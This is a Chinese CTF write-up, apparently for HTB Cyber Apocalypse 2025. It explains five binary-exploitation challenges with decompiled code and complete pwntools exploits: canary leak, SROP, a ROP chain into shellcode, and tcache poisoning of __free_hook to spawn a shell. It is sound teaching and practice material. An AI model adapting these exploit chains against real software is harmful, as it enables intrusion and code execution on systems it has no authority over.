+++
date = '2025-06-06T16:56:04+08:00'
draft = false
title = 'Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria'
categories = ["WP"]

+++

<!--more-->

> HTB的一个比赛
>



## Quack_Quack

```c
unsigned __int64 duckling()
{
  char *v1; // [rsp+8h] [rbp-88h]
  _QWORD buf[4]; // [rsp+10h] [rbp-80h] BYREF
  _QWORD v3[11]; // [rsp+30h] [rbp-60h] BYREF
  unsigned __int64 v4; // [rsp+88h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  memset(buf, 0, sizeof(buf));
  memset(v3, 0, 80);
  printf("Quack the Duck!\n\n> ");
  fflush(_bss_start);
  read(0, buf, 0x66u);
  v1 = strstr((const char *)buf, "Quack Quack ");
  if ( !v1 )
  {
    error("Where are your Quack Manners?!\n");
    exit(1312);
  }
  printf("Quack Quack %s, ready to fight the Duck?\n\n> ", v1 + 32);
  read(0, v3, 0x6Au);
  puts("Did you really expect to win a fight against a Duck?!\n");
  return v4 - __readfsqword(0x28u);
}
```

```c
unsigned __int64 duck_attack()
{
  char buf; // [rsp+3h] [rbp-Dh] BYREF
  int fd; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  fd = open("./flag.txt", 0);
  if ( fd < 0 )
  {
    perror("\nError opening flag.txt, please contact an Administrator\n");
    exit(1);
  }
  while ( read(fd, &buf, 1u) > 0 )
    fputc(buf, _bss_start);
  close(fd);
  return v3 - __readfsqword(0x28u);
}
```



### strstr函数

```
#include <string.h>
char *strstr(const char *haystack, const char *needle);
```

- **功能**：在 `haystack`（主字符串）中查找 `needle`（子字符串）的首次出现位置。
- 返回值：
	- 找到时：返回指向首次匹配位置的指针。
	- 未找到时：返回 `NULL`。

```
char *s = "Hello_CTF_World";
char *p = strstr(s, "CTF"); // p 指向 "CTF_World"
```

### 思路

- 通过strstr函数，控制v1指针
- 让v1+32指向canary，第20行的printf会输出canary
- read进canary、控制返回地址到duck_attack，输出flag

### exp

```python
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
context(os='linux',arch='amd64',log_level='debug')
def dbg():
    gdb.attach(p)
    # pause()

address = './quack_quack'
p = process(address)

elf = ELF(address)
libc = elf.libc

# ip = ""
# port = 
#p = remote(ip,port)

backdoor = 0x40137F

#canary会以\x00结尾，所以要加个1
p.recvuntil(b'Quack the Duck!\n\n> ')
pl = b'a'*(0x80 - 0x8 - 0x20 + 1) + b"Quack Quack "
# dbg()
p.send(pl)

p.recvuntil(b'Quack Quack ')
canary = u64(p.recv(7).rjust(8,b'\x00')) #在低位补\x00
success("canary---> 0x%x",canary)

pl = b'a'*(0x60 - 0x8)
pl+= p64(canary)
pl+=p64(0xdeedbeef)
pl+= p16(0x137f)
# dbg()
p.send(pl)

p.interactive()
```



## blessing

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t size; // [rsp+8h] [rbp-28h] BYREF
  unsigned __int64 i; // [rsp+10h] [rbp-20h]
  _QWORD *v6; // [rsp+18h] [rbp-18h]
  void *buf; // [rsp+20h] [rbp-10h]
  unsigned __int64 v8; // [rsp+28h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setup(argc, argv, envp);
  banner();
  size = 0;
  v6 = malloc(0x30000u);
  *v6 = 1;
  printstr(
    "In the ancient realm of Eldoria, a roaming bard grants you good luck and offers you a gift!\n"
    "\n"
    "Please accept this: ");
  printf("%p", v6);
  sleep(1u);
  for ( i = 0; i <= 0xD; ++i )
  {
    printf("\b \b");
    usleep(0xEA60u);
  }
  puts("\n");
  printf(
    "%s[%sBard%s]: Now, I want something in return...\n\nHow about a song?\n\nGive me the song's length: ",
    "\x1B[1;34m",
    "\x1B[1;32m",
    "\x1B[1;34m");
  __isoc99_scanf("%lu", &size);
  buf = malloc(size);
  printf("\n%s[%sBard%s]: Excellent! Now tell me the song: ", "\x1B[1;34m", "\x1B[1;32m", "\x1B[1;34m");
  read(0, buf, size);
  *(_QWORD *)((char *)buf + size - 1) = 0;
  write(1, buf, size);
  if ( *v6 )
    printf("\n%s[%sBard%s]: Your song was not as good as expected...\n\n", "\x1B[1;31m", "\x1B[1;32m", "\x1B[1;31m");
  else
    read_flag();
  return 0;
}
```

> man malloc
>
> RETURN VALUE  
>
> ```
>     The malloc(), calloc(), realloc(), and reallocarray() functions
>     return a pointer to the allocated memory, which is suitably
>     aligned for any type that fits into the requested size or less.
>     On error, these functions return NULL and set errno.  Attempting
>     to allocate more than PTRDIFF_MAX bytes is considered an error, as
>     an object that large could cause later pointer subtraction to
>     overflow.
> ```



### 思路

- 程序会输出heap_addr

- heap_addr很大，malloc(heap_addr)的时候，系统直接拒绝，返回NULL

- 所以可以控制  (_QWORD *)((char *)buf + size - 1) = v6  

- 就可以让 *v6 = 0，去readflag

	

### exp

```python
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
context(os='linux',arch='amd64',log_level='debug')
def dbg():
    gdb.attach(p)
    # pause()

address = './blessing'
p = process(address)

elf = ELF(address)
libc = elf.libc

# ip = ""
# port = 
#p = remote(ip,port)

p.recvuntil(b'Please accept this: ')
heap_addr = int(p.recv(14),16)

success("heap_addr = 0x%x",heap_addr)

# dbg()
p.sendlineafter(b'length: ',str(heap_addr +1))
p.send(b'a')

p.interactive()
```



## laconic

> 考察SROP

程序就几句汇编

```assembly
public _start
_start proc near
mov     rdi, 0          ; Alternative name is '_start'
                        ; __start
mov     rsi, rsp
sub     rsi, 8
mov     rdx, 106h
syscall                 ; LINUX -
retn
_start endp
```

可以发现有栈溢出

有发现binsh，但是IDA里没显示

```
pwndbg> search "/bin/sh"
Searching for value: '/bin/sh'
laconic         0x43238 0x68732f6e69622f /* '/bin/sh' */
```

直接execve("/bin/sh",0,0)就可以了

### exp

```python
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
context(os='linux',arch='amd64',log_level='debug')
def dbg():
    gdb.attach(p)
    # pause()

address = './laconic'
p = process(address)

elf = ELF(address)
libc = elf.libc

# ip = ""
# port = 
#p = remote(ip,port)

binsh = 0x43238
pop_rax_ret = 0x43018
syscall_ret = 0x43015

pl = b'a'*8
pl+= p64(pop_rax_ret)
pl+= p64(15)
pl+=p64(syscall_ret)
frame     = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = binsh
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = syscall_ret
pl+= bytes(frame)

p.send(pl)

p.interactive()
```





## crossbow

查看两个关键函数

```c
__int64 __fastcall training(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5, int a6)
{
  __int64 v6; // rdx
  __int64 v7; // rcx
  int v8; // r8d
  int v9; // r9d
  int v10; // r8d
  int v11; // r9d
  _BYTE v13[32]; // [rsp+0h] [rbp-20h] BYREF

  printf(
    (unsigned int)"%s\n[%sSir Alaric%s]: You only have 1 shot, don't miss!!\n",
    (unsigned int)"\x1B[1;34m",
    (unsigned int)"\x1B[1;33m",
    (unsigned int)"\x1B[1;34m",
    a5,
    a6);
  target_dummy((__int64)v13, (__int64)"\x1B[1;34m", v6, v7, v8, v9);
  return printf(
           (unsigned int)"%s\n[%sSir Alaric%s]: That was quite a shot!!\n\n",
           (unsigned int)"\x1B[1;34m",
           (unsigned int)"\x1B[1;33m",
           (unsigned int)"\x1B[1;34m",
           v10,
           v11);
}
```



```c
//这里我省略了一些无关代码
__int64 __fastcall target_dummy(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5, int a6)
{
  int v6; // edx
  int v7; // ecx
  int v8; // r8d
  int v9; // r9d
  int v10; // r8d
  int v11; // r9d
  _QWORD *v12; // rbx
  int v13; // r8d
  int v14; // r9d
  __int64 result; // rax
  int v16; // r8d
  int v17; // r9d
  int v18; // [rsp+1Ch] [rbp-14h] BYREF

  if ( (unsigned int)scanf((unsigned int)"%d%*c", (unsigned int)&v18, v6, v7, v8, v9) != 1 )
  {
    printf(
      (unsigned int)"%s\n[%sSir Alaric%s]: Are you aiming for the birds or the target kid?!\n\n",
      (unsigned int)"\x1B[1;31m",
      (unsigned int)"\x1B[1;33m",
      (unsigned int)"\x1B[1;31m",
      v10,
      v11);
    exit(1312);
  }
  v12 = (_QWORD *)(8LL * v18 + a1);
  *v12 = calloc(1, 128);
  if ( !*v12 )
  {
    printf(
      (unsigned int)"%s\n[%sSir Alaric%s]: We do not want cowards here!!\n\n",
      (unsigned int)"\x1B[1;31m",
      (unsigned int)"\x1B[1;33m",
      (unsigned int)"\x1B[1;31m",
      v13,
      v14);
    exit(6969);
  }

  result = fgets_unlocked(*(_QWORD *)(8LL * v18 + a1), 128, &_stdin_FILE);

  return result;
}
```



```c
  v12 = (_QWORD *)(8LL * v18 + a1);
  *v12 = calloc(1, 128);
```

这里的v18可以通过前面的scanf控制，a1是caller函数（training）的变量v13。v13-0x10(a1-0x10)是target函数(callee)的rbp

这里把v18设置成-0x10，那么，target函数leave;ret的时候，training函数的rbp和training函数的返回地址就会被我们控制(通过fgets_unlocked(*(_QWORD *)(8LL * v18 + a1), 128, &_stdin_FILE);)

### exp

```python
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
context(os='linux',arch='amd64',log_level='debug')
def dbg():
    gdb.attach(p)
    # pause()

address = './crossbow'
p = process(address)

elf = ELF(address)
libc = elf.libc

# ip = ""
# port = 
#p = remote(ip,port)

pop_rax_ret = 0x401001
pop_rdi_ret = 0x401d6c
pop_rsi_ret = 0x40566b
pop_rdx_ret = 0x401139
syscall_ret = 0x404b51 #mprotect 0xa read 0
fgets = 0x401CC0
stdin = 0x40E020
mprotect_addr = 0x40a320

# dbg()
p.recvuntil(b'shoot: ')
p.sendline(b'-2')
#mprotect给bss段权限7，read读入shellcraft.sh进bss
#然后执行shellcode
p.recvuntil(b'> ')
#mprotect(0x40e000,0x1000,7)
pl = b'a'*8
pl += p64(pop_rdi_ret) + p64(0x40e000)
pl+= p64(pop_rsi_ret) + p64(0x1000)
pl+= p64(pop_rdx_ret) + p64(7)
pl+= p64(mprotect_addr)

pl+= p64(pop_rdi_ret) + p64(0x40E220)
pl+= p64(pop_rsi_ret) + p64(0x100)
pl+= p64(pop_rdx_ret) + p64(stdin)
pl+= p64(fgets)
pl+= p64(0x40e221)
# dbg()
p.send(pl)
# dbg()
p.send(asm(shellcraft.sh()))


p.interactive()
```



这里执行shellcode的地址是0x40e221

```
pwndbg> disassemble /r 0x40e220, 0x40e250                                                                                      
Dump of assembler code from 0x40e220 to 0x40e250:
   0x000000000040e220 <completed+0>:    00 6a 68        add    BYTE PTR [rdx+0x68],ch
   0x000000000040e223:  48 b8 2f 00 00 00 00 00 00 00   movabs rax,0x2f
   0x000000000040e22d <__sysinfo+5>:    00 00   add    BYTE PTR [rax],al
```



```
pwndbg> disassemble /r 0x40e221, 0x40e230
Dump of assembler code from 0x40e221 to 0x40e230:
   0x000000000040e221:  6a 68   push   0x68
   0x000000000040e223:  48 b8 2f 00 00 00 00 00 00 00   movabs rax,0x2f
```

可以看到，从0x40e221开始才是正确的shellcode

可能是fgets_unlock就是这样的：

```
 RAX  0x6a
 RBX  0x40e020 (__stdin_FILE) ◂— 0x49 /* 'I' */
 RCX  1
 RDX  0x40e301 (buf+1) ◂— add byte ptr [rax], al /* 0xa000000000000 */
 RDI  1
 RSI  0x743046e24010 —▸ 0x743046e24067 ◂— 0x3f07dd419300946a
 R8   0x1c
 R9   0x3d
 R10  7
 R11  0x202
 R12  0x40e301 (buf+1) ◂— add byte ptr [rax], al /* 0xa000000000000 */
 R13  0x40e300 (buf) ◂— add byte ptr [rax], al /* 0xa00000000000000 */
 R14  0
 R15  0xfe
 RBP  0x6161616161616161 ('aaaaaaaa')
 RSP  0x743046e24080 —▸ 0x40a356 (mprotect+54) ◂— add rsp, 8
*RIP  0x401db6 (fgets_unlocked+246) ◂— mov byte ptr [rdx], al
 EFLAGS 0x206 [ cf PF af zf sf IF df of ]
─────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────
   0x401ddd <fgets_unlocked+285>    call   __uflow                     <__uflow>
 
   0x401de2 <fgets_unlocked+290>    test   eax, eax                        0x6a & 0x6a     EFLAGS => 0x206 [ cf PF af zf sf IF df of ]
   0x401de4 <fgets_unlocked+292>    js     fgets_unlocked+449          <fgets_unlocked+449>
 
   0x401dea <fgets_unlocked+298>    mov    rdx, r12                        RDX => 0x40e301 (buf+1) ◂— add byte ptr [rax], al /* 0xa000000000000 */
   0x401ded <fgets_unlocked+301>    jmp    fgets_unlocked+246          <fgets_unlocked+246>
    ↓
 ► 0x401db6 <fgets_unlocked+246>    mov    byte ptr [rdx], al              [buf+1] => 0x6a
   0x401db8 <fgets_unlocked+248>    sub    r15d, 1                         R15D => 253 (0xfe - 0x1)
   0x401dbc <fgets_unlocked+252>    lea    r12, [rdx + 1]                  R12 => 0x40e302 (buf+2) ◂— add byte ptr [rax], al /* 0xa0000000000 */
   0x401dc0 <fgets_unlocked+256>    cmp    al, 0xa                         0x6a - 0xa     EFLAGS => 0x206 [ cf PF af zf sf IF df of ]
   0x401dc2 <fgets_unlocked+258>    je     fgets_unlocked+137          <fgets_unlocked+137>
 
   0x401dc4 <fgets_unlocked+260>    test   r15d, r15d         0xfd & 0xfd     EFLAGS => 0x202 [ cf pf af zf sf IF df of ]
```



## strategist

> tcache posioning

### 逆向分析

#### menu

```c
__int64 menu()
{
  printf(
    "%s+-----------------+\n"
    "| 1. Create  plan |\n"
    "| 2. Show    plan |\n"
    "| 3. Edit    plan |\n"
    "| 4. Delete  plan |\n"
    "+-----------------+\n"
    "\n"
    "> ",
    "\x1B[1;34m");
  return read_num();
}
```

#### create plan

先从上往下检查main函数的栈里哪个位置为空，返回给v3。

根据输入的v2，malloc(v2)。

往申请的堆里读入v2大小的内容。

把申请的堆用户地址写入main函数的栈里。

```c
unsigned __int64 __fastcall create_plan(__int64 a1)
{
  int v2; // [rsp+18h] [rbp-18h] BYREF
  int v3; // [rsp+1Ch] [rbp-14h]
  void *heap_addr; // [rsp+20h] [rbp-10h]
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  v3 = check(a1);  //检查main函数栈里从上到下哪个位置为空
  if ( v3 == -1 )
  {
    printf("%s\n[%sSir Alaric%s]: Don't go above your head kiddo!\n\n", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m");
    exit(1312);
  }
  printf("%s\n[%sSir Alaric%s]: How long will be your plan?\n\n> ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
  v2 = 0;
  __isoc99_scanf("%d", &v2);
  heap_addr = malloc(v2);
  if ( !heap_addr )
  {
    printf("%s\n[%sSir Alaric%s]: This plan will be a grand failure!\n\n", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m");
    exit(1312);
  }
  printf("%s\n[%sSir Alaric%s]: Please elaborate on your plan.\n\n> ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
  read(0, heap_addr, v2);
  *(a1 + 8LL * v3) = heap_addr;
  printf(
    "%s\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\n\n",
    "\x1B[1;32m",
    "\x1B[1;33m",
    "\x1B[1;32m");
  return __readfsqword(0x28u) ^ v5;
}
```

#### show plan

根据输入的v2，索引相应的plan并输出存在plan里的内容

```c
unsigned __int64 __fastcall show_plan(__int64 a1)
{
  signed int v2; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("%s\n[%sSir Alaric%s]: Which plan you want to view?\n\n> ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
  v2 = 0;
  __isoc99_scanf("%d", &v2);
  if ( v2 >= 0x64 || !*(8LL * v2 + a1) )
  {
    printf("%s\n[%sSir Alaric%s]: There is no such plan!\n\n", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m");
    exit(1312);
  }
  printf("%s\n[%sSir Alaric%s]: Plan [%d]: %s\n", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m", v2, *(8LL * v2 + a1));
  return __readfsqword(0x28u) ^ v3;
}
```

#### edit plan

输入v3选择相应plan

根据plan内的内容长度v1，再次read进v1长度的内容

**但是这里的strlen存在off-by-one，可以覆盖掉下一个春困**

```c
unsigned __int64 __fastcall edit_plan(__int64 a1)
{
  size_t v1; // rax
  signed int v3; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("%s\n[%sSir Alaric%s]: Which plan you want to change?\n\n> ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
  v3 = 0;
  __isoc99_scanf("%d", &v3);
  if ( v3 >= 0x64 || !*(8LL * v3 + a1) )
  {
    printf("%s\n[%sSir Alaric%s]: There is no such plan!\n\n", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m");
    exit(1312);
  }
  printf("%s\n[%sSir Alaric%s]: Please elaborate on your new plan.\n\n> ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
  v1 = strlen(*(8LL * v3 + a1));
  read(0, *(8LL * v3 + a1), v1);
  putchar(10);
  return __readfsqword(0x28u) ^ v4;
}
```

#### delete plan

输入v2，在栈中索引相应plan

free掉相应的heap

并把存在栈上的heap_pointer置0

```c
unsigned __int64 __fastcall delete_plan(__int64 a1)
{
  signed int v2; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("%s\n[%sSir Alaric%s]: Which plan you want to delete?\n\n> ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
  v2 = 0;
  __isoc99_scanf("%d", &v2);
  if ( v2 >= 0x64 || !*(8LL * v2 + a1) )
  {
    printf("%s\n[%sSir Alaric%s]: There is no such plan!\n\n", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m");
    exit(1312);
  }
  free(*(8LL * v2 + a1));
  *(8LL * v2 + a1) = 0;
  printf("%s\n[%sSir Alaric%s]: We will remove this plan!\n\n", "\x1B[1;32m", "\x1B[1;33m", "\x1B[1;32m");
  return __readfsqword(0x28u) ^ v3;
}
```

### 思路

**覆盖free_hook(发现覆盖malloc_hook为one_gadget都不行)**

1. 泄露libc。

	- 先申请一个大于tcache范围的块，再申请一个块，防止前一个chunk与topchunk合并
	- 然后free掉第一个chunk，
	- 再重新申请出来，并把用户区里的libc地址edit出来，计算libc地址。

2. 覆盖free_hook

	- 利用off-by-one改大其中一个块，再申请出来，覆盖掉下一个chunk的内容

		

### exp

```python
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
context(os='linux',arch='amd64',log_level='debug')
def dbg():
    gdb.attach(p)
    pause()

address = './strategist'
p = process(address)

elf = ELF(address)
libc = elf.libc

# ip = ""
# port = 
#p = remote(ip,port)

one_gadget = [0x10a41c,0x4f3ce,0x4f3d5,0x4f432]

def create(long,plan):
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'> ',str(long))
    p.sendafter(b'> ',plan)

def show(number):
    p.sendlineafter(b'> ',b'2')
    p.sendlineafter(b'> ',str(number))

def edit(number,plan):
    p.sendlineafter(b'> ',b'3')
    p.sendlineafter(b'> ',str(number))
    p.sendafter(b'> ',plan)

def delete(number):
    p.sendlineafter(b'> ',b'4')
    p.sendlineafter(b'> ',str(number))

pl = b'aaaa'
create(0x500,pl)
create(0x100,pl)
delete(0)
delete(1)
create(0x500,b'a')
show(0)
# leak libc base addr
p.recvuntil(b'Plan [0]: a')
libc_addr = u64(p.recv(5).rjust(8,b'\x00'))
libc_addr = libc_addr >> 16
libc_base_addr = libc_addr-0x733efa3ebc00+0x733efa000000
success("libc_base_addr ----> 0x%x",libc_base_addr)
libc.address = libc_base_addr
delete(0)

malloc_hook_addr = libc_base_addr + 0x3EBC30
one_gadget_addr = one_gadget[0] + libc_base_addr
create(0x48,b'a'*0x48)
create(0x48,b'b'*0x48)
create(0x48,b'c'*0x48)
edit(0,b'w'*0x48+p8(0x80))
delete(1)
delete(2)
create(0x70, b'6'*0x50 + p64(libc.sym.__free_hook))
create(0x40, b'/bin/sh\x00')
create(0x40, p64(libc.sym.system))
delete(2)

p.interactive()
```

